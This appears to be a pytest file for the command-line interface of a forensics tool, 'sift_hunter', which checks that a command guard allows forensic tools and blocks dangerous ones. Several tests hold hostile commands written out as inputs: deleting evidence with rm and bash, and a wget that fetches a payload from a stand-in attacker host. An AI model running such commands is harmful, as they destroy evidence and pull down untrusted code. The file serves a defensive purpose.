"""Tests for Click CLI commands."""
import os
import pytest
from click.testing import CliRunner
from sift_hunter.cli import main


def test_version():
    runner = CliRunner()
    result = runner.invoke(main, ["version"])
    assert result.exit_code == 0
    assert "1.0.0" in result.output


def test_check_allowed_command():
    runner = CliRunner()
    result = runner.invoke(main, ["check", "MFTECmd -f test.csv"])
    assert result.exit_code == 0
    assert "ALLOWED" in result.output


def test_check_blocked_rm():
    runner = CliRunner()
    result = runner.invoke(main, ["check", "rm -rf /evidence"])
    assert result.exit_code == 0
    assert "BLOCKED" in result.output


def test_check_blocked_wget():
    runner = CliRunner()
    result = runner.invoke(main, ["check", "wget http://attacker.com/payload"])
    assert result.exit_code == 0
    assert "BLOCKED" in result.output


def test_check_blocked_bash():
    runner = CliRunner()
    result = runner.invoke(main, ["check", "bash -c 'rm evidence.img'"])
    assert result.exit_code == 0
    assert "BLOCKED" in result.output


def test_audit_missing_finding(tmp_path):
    os.environ["SIFT_AUDIT_LOG"] = str(tmp_path / "audit.jsonl")
    runner = CliRunner()
    result = runner.invoke(main, ["audit", "F-nonexistent"])
    assert result.exit_code == 0
    assert "No audit entries" in result.output


def test_help_text():
    runner = CliRunner()
    result = runner.invoke(main, ["--help"])
    assert result.exit_code == 0
    assert "analyze" in result.output
    assert "audit" in result.output
    assert "check" in result.output
    assert "server" in result.output


def test_analyze_requires_evidence():
    runner = CliRunner()
    result = runner.invoke(main, ["analyze"])
    assert result.exit_code != 0


def test_analyze_without_llm_key_aborts_with_guidance(tmp_path, monkeypatch):
    """No API key must fail loudly with guidance, not silently return 0 findings."""
    from sift_hunter.config import config
    monkeypatch.setattr(config, "GROQ_API_KEY", "")
    monkeypatch.setattr(config, "ANTHROPIC_API_KEY", "")
    evidence = tmp_path / "mft.csv"
    evidence.write_text("EntryNumber,Name\n1,svchost.exe\n")
    runner = CliRunner()
    result = runner.invoke(main, ["analyze", str(evidence)])
    assert result.exit_code == 2
    assert "No LLM API key" in result.output
